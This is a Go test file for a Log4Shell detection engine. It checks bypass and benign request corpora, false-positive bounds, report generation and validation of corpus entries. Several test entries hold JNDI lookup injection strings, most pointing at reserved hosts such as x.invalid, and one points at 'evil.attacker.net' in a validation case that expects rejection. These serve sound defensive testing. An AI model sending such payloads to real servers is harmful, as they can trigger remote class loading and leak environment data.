package corpus

import (
	"flag"
	"os"
	"strings"
	"testing"
	"testing/fstest"

	"github.com/TurlaFSB/logshield/internal/engine"
)

var update = flag.Bool("update", false, "rewrite docs/eval/report.md")

const (
	generatedN    = 100_000
	generatedSeed = 20211209 // the day Log4Shell was disclosed
	reportPath    = "../../docs/eval/report.md"
)

func load(t *testing.T, dataset string) []Entry {
	t.Helper()
	entries, err := Load(os.DirFS("../../corpus"), dataset)
	if err != nil {
		t.Fatalf("%v", err)
	}
	return entries
}

func TestBypassCorpus(t *testing.T) {
	out := Evaluate(load(t, "bypass"), engine.Config{})
	if f := Failures(out); f != "" {
		t.Errorf("bypass corpus failures:\n%s", f)
	}
}

func TestBenignCorpus(t *testing.T) {
	out := Evaluate(load(t, "benign"), engine.Config{})
	if f := Failures(out); f != "" {
		t.Errorf("benign corpus failures:\n%s", f)
	}
}

// TestEvaluationTargets enforces the project's quality bars on the whole
// corpus and keeps docs/eval/report.md in sync with the engine. Run
// `go test ./internal/corpus -update` (make eval) after changing the engine
// or the corpora.
func TestEvaluationTargets(t *testing.T) {
	n := generatedN
	if testing.Short() {
		t.Skip("full evaluation skipped in short mode")
	}
	rep := Report{
		Bypass:    Evaluate(load(t, "bypass"), engine.Config{}),
		Benign:    Evaluate(load(t, "benign"), engine.Config{}),
		Generated: Evaluate(Generate(n, generatedSeed), engine.Config{}),
		GenSeed:   generatedSeed,
		Targets:   DefaultTargets,
		Rules:     engine.Rules(),
	}

	if s := Summarize(rep.Bypass); s.Misses > rep.Targets.MaxMisses {
		t.Errorf("%d attack entries not blocked (target %d)", s.Misses, rep.Targets.MaxMisses)
	}
	g, h := Summarize(rep.Generated), Summarize(rep.Benign)
	if fp := g.FalsePositives + h.FalsePositives; WilsonUpper(fp, g.Total+h.Total) > rep.Targets.MaxFalsePositiveRate {
		t.Errorf("false positives %d of %d exceed target (95%% upper bound %.4f%%)", fp, g.Total+h.Total,
			WilsonUpper(fp, g.Total+h.Total)*100)
	}
	if f := Failures(rep.Generated); f != "" {
		if len(f) > 4000 {
			f = f[:4000] + "..."
		}
		t.Errorf("generated benign failures:\n%s", f)
	}

	got := rep.Markdown()
	if *update {
		if err := os.MkdirAll("../../docs/eval", 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(reportPath, []byte(got), 0o644); err != nil {
			t.Fatal(err)
		}
		return
	}
	want, err := os.ReadFile(reportPath)
	if err != nil {
		t.Fatalf("read report: %v (run with -update)", err)
	}
	if string(want) != got {
		t.Error("docs/eval/report.md is stale; run `make eval`")
	}
}

func TestGenerateIsDeterministic(t *testing.T) {
	a, b := Generate(200, 7), Generate(200, 7)
	for i := range a {
		ra, _ := a[i].EngineRequest()
		rb, _ := b[i].EngineRequest()
		if a[i].ID != b[i].ID || ra.Target != rb.Target || string(ra.Body) != string(rb.Body) {
			t.Fatalf("entry %d differs between runs", i)
		}
	}
	if c := Generate(50, 8); c[0].Request.Target == a[0].Request.Target && c[1].Request.Target == a[1].Request.Target {
		t.Error("different seeds gave the same requests")
	}
}

func TestWilsonUpper(t *testing.T) {
	if got := WilsonUpper(0, 0); got != 1 {
		t.Errorf("n=0: %v", got)
	}
	// Rule of three: with 0 events in 100000 trials the 95% bound is ~3.8e-5.
	if got := WilsonUpper(0, 100000); got < 3.5e-5 || got > 4.1e-5 {
		t.Errorf("0/100000: %v", got)
	}
	if lo, hi := WilsonUpper(1, 1000), WilsonUpper(10, 1000); lo >= hi {
		t.Errorf("bound must grow with events: %v %v", lo, hi)
	}
}

func TestSummarizeAndHelpers(t *testing.T) {
	entries := []Entry{
		{ID: "a", Class: "x", Source: Source{Type: SourceProject}, Request: Request{Method: "GET", Target: "/?q=${jndi:ldap://x.invalid/a}"}, Expect: Expect{Decision: "malicious", Rules: []string{"LSH-1001"}}},
		{ID: "b", Class: "y", Source: Source{Type: SourceDerived}, Request: Request{Method: "GET", Target: "/"}, Expect: Expect{Decision: "malicious"}},                          // miss
		{ID: "c", Class: "y", Source: Source{Type: SourceProject}, Request: Request{Method: "GET", Target: "/?q=${jndi:ldap://x.invalid/a}"}, Expect: Expect{Decision: "clean"}}, // FP
		{ID: "d", Class: "z", Source: Source{Type: SourceProject}, Request: Request{Method: "GET", Target: "/?q=${env:HOME}"}, Expect: Expect{Decision: "suspicious", Forbid: []string{"LSH-1001"}}},
		{ID: "e", Class: "z", Source: Source{Type: SourceProject}, Request: Request{Method: "GET", Target: "/"}, Expect: Expect{Decision: "clean", Rules: []string{"LSH-1001"}}},
		{ID: "f", Class: "z", Source: Source{Type: SourceProject}, Request: Request{Method: "GET", Target: "/?q=${env:HOME}"}, Expect: Expect{Decision: "suspicious", Forbid: []string{"LSH-2002"}}},
		{ID: "g", Class: "z", Source: Source{Type: SourceProject}, Request: Request{Method: "GET", Target: "/", Body: "x", BodyB64: "eA=="}, Expect: Expect{Decision: "clean"}},
	}
	out := Evaluate(entries, engine.Config{})
	s := Summarize(out)
	if s.Total != 7 || s.Misses != 1 || s.FalsePositives != 1 || s.Failed != 5 {
		t.Errorf("stats = %+v", s)
	}
	if f := Failures(out); !strings.Contains(f, "b [y]") || !strings.Contains(f, "missing rule LSH-1001") ||
		!strings.Contains(f, "forbidden rule LSH-2002") || !strings.Contains(f, "mutually exclusive") {
		t.Errorf("failures:\n%s", f)
	}
	if got := Classes(entries); strings.Join(got, ",") != "x,y,z" {
		t.Errorf("Classes = %v", got)
	}
	if got := SourceCounts(entries); got[SourceProject] != 6 || got[SourceDerived] != 1 {
		t.Errorf("SourceCounts = %v", got)
	}
	classes, groups := ByClass(out)
	if len(classes) != 3 || len(groups["z"]) != 4 {
		t.Errorf("ByClass = %v %v", classes, groups)
	}
}

func TestMarkdownIsStable(t *testing.T) {
	entries := []Entry{{ID: "a", Class: "x", Source: Source{Type: SourcePublic, Ref: "R", URL: "https://example.com/r"},
		Request: Request{Method: "GET", Target: "/?q=${jndi:ldap://x.invalid/a}"}, Expect: Expect{Decision: "malicious"}}}
	rep := Report{Bypass: Evaluate(entries, engine.Config{}), Targets: DefaultTargets, Rules: engine.Rules(), GenSeed: 1}
	a, b := rep.Markdown(), rep.Markdown()
	if a != b || !strings.Contains(a, "[R](https://example.com/r)") || !strings.Contains(a, "pass") {
		t.Errorf("unexpected report:\n%s", a)
	}
	bad := Report{Bypass: Evaluate([]Entry{{ID: "a", Class: "x", Request: Request{Method: "GET", Target: "/"}, Expect: Expect{Decision: "malicious"}}}, engine.Config{}), Targets: DefaultTargets}
	if !strings.Contains(bad.Markdown(), "**FAIL**") {
		t.Error("a miss must be reported as FAIL")
	}
}

func TestValidateRejectsBadEntries(t *testing.T) {
	good := Entry{ID: "ok-1", Class: "c", Source: Source{Type: SourceProject}, Request: Request{Method: "GET", Target: "/"}, Expect: Expect{Decision: "clean"}}
	mut := func(f func(*Entry)) Entry { e := good; f(&e); return e }
	cases := map[string]Entry{
		"id must be":          mut(func(e *Entry) { e.ID = "Bad ID" }),
		"missing class":       mut(func(e *Entry) { e.Class = "" }),
		"public-sample needs": mut(func(e *Entry) { e.Source = Source{Type: SourcePublic} }),
		"derived needs":       mut(func(e *Entry) { e.Source = Source{Type: SourceDerived} }),
		"unknown source":      mut(func(e *Entry) { e.Source.Type = "hearsay" }),
		"unknown expected":    mut(func(e *Entry) { e.Expect.Decision = "maybe" }),
		"unknown rule":        mut(func(e *Entry) { e.Expect.Rules = []string{"LSH-0000"} }),
		"needs method":        mut(func(e *Entry) { e.Request.Method = "" }),
		"non-reserved host": mut(func(e *Entry) {
			e.Request.Target = "/?q=${jndi:ldap://evil.attacker.net/a}"
		}),
		"body_b64": mut(func(e *Entry) { e.Request.BodyB64 = "!!!" }),
	}
	for want, e := range cases {
		probs := Validate([]Entry{e})
		if len(probs) == 0 || !strings.Contains(strings.Join(probs, "\n"), want) {
			t.Errorf("%q: problems = %v", want, probs)
		}
	}
	if probs := Validate([]Entry{good, good}); len(probs) == 0 || !strings.Contains(probs[0], "duplicate") {
		t.Errorf("duplicate not rejected: %v", probs)
	}
	if probs := Validate([]Entry{good}); len(probs) != 0 {
		t.Errorf("good entry rejected: %v", probs)
	}
}

func TestInertHost(t *testing.T) {
	for _, h := range []string{"x.invalid", "A.EXAMPLE.COM", "example.com", "192.0.2.1", "198.51.100.7", "203.0.113.9", "127.0.0.1", "localhost", "u@x.invalid", "127.0.0.1#evil.invalid", "x.example.net."} {
		if !inertHost(h) {
			t.Errorf("inertHost(%q) = false", h)
		}
	}
	for _, h := range []string{"evil.net", "10.0.0.1", "google.com", "notexample.com.evil.org"} {
		if inertHost(h) {
			t.Errorf("inertHost(%q) = true", h)
		}
	}
}

func TestLoadErrors(t *testing.T) {
	if _, err := Load(fstest.MapFS{}, "none"); err == nil {
		t.Error("empty directory must be an error")
	}
	fsys := fstest.MapFS{
		"d/a.jsonl": {Data: []byte("{not json}\n\n{\"id\":\"x\",\"unknown_field\":1}\n")},
	}
	_, err := Load(fsys, "d")
	if err == nil || !strings.Contains(err.Error(), "d/a.jsonl:1") || !strings.Contains(err.Error(), "d/a.jsonl:3") {
		t.Errorf("Load error = %v", err)
	}
}
